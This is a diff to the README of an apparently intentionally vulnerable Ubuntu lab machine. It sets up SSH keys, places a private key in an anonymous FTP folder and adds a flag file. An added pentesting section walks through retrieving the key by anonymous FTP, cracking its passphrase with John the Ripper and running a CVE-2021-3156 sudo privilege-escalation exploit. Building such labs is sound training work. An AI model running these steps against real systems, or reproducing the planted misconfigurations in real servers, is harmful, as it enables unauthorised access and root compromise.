@@ -41,17 +41,6 @@ The commands above only install the server and shared folders. You still have to
 # smbpasswd -a <username>
 ```
 
-Sudo upgrade
----------------
-```
-$ chmod +x upgradesudo.sh
-# ./upgradesudo.sh
-``` 
-The script serves to upgrade sudo version. After installation Ubuntu 18.04.5 server, the version of the
-sudo was `1.8.21p2`, but we wanted a version `1.8.27`, because this version has two possible bugs
-`CVE-2019-14287` and `CVE-2021-3156`.
-The script will install the necessary packages and the necessery version of the sudo to install it
-
 Set up new user
 ---------------
 ### Create new user
@@ -61,16 +50,52 @@ Set up new user
 - `sudo passwd <username>`... sets a password for the user `<username>`, 
 
 ### Generating SSH keys
-`ssh-keygen`
-- `cat ~/.ssh/id_rsa.pub > ~/.ssh/authorized_keys` ... public key to text file name `authorized_keys`
-- `sudo mv ~/.ssh/id_rsa /var/ftp/.ssh/id_rsa`
-  - will probably need to be create directions `/var/ftp/.ssh`
-  - `sudo mkdir /var/ftp` `sudo mkdir /var/ftp/.ssh`
+`ssh-keygen -t rsa -b 2048` 
+- `mkdir /home/<username>/.ssh/authorized_keys`
+- `cp /home/<username>/.ssh/id_rsa.pub /home/<username>/.ssh/authorized_keys`
+- Private key to FTP
+  - `mv /home/<username>/.ssh/id_rsa /home/<username>`
+  - `chmod +rw /home/<username>/id_rsa`
+  - `sudo mv /home/<username>/id_rsa /var/ftp/.ssh/`
 
-### CVE-2019-14287
-`sudo bash -c 'echo "xpepik ALL=(ALL, !root) /bin/cat, /usr/bin/whoami" > /etc/sudoers.d/xpepik'`
+### Set /etc/ssh/sshd_config
+- `sudo nano /etc/ssh/sshd_config`
+  - add `AuthorizedKeysFile %h/.ssh/authorized_keys/id_rsa.pub`
+  - No password authentication for user `<username>`:
+    - `Match User <username>`
+    - `PasswordAuthentication no`    
+  - `service ssh restart`
 
 ### flags.txt
 - `sudo bash -c 'echo "https://www.youtube.com/watch?v=5T5BY1j2MkE" > /home/xpepik/flags.txt'`
 - `sudo chmod 600 /home/xpepik/flags.txt`
 
+Instruction for PENTESTING
+----------
+### GET ssh id_rsa from FTP
+```
+ftp <IP_target>
+username: anonymous
+password: anonymous
+cd .ssh/
+get id_rsa
+exit
+chmod 600 id_rsa
+```
+
+### "Crack" ssh key with John The Ripper
+```
+$ locate ssh2john.py
+$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash 
+$ locate rockyou.txt.gz
+$ gunzip rockyou.txt.gz
+$ john id_rsa.hash -wordlist= rockyou.txt
+```
+
+### CVE-2021-3156
+- directory contains `hac.c`, `lib.c`, `Makefile`, `README.md`
+```
+$ cd /home/<username>/CVE-2021-3156/
+$ make
+$ ./sudo-hax-me-a-sandwich 0
+```
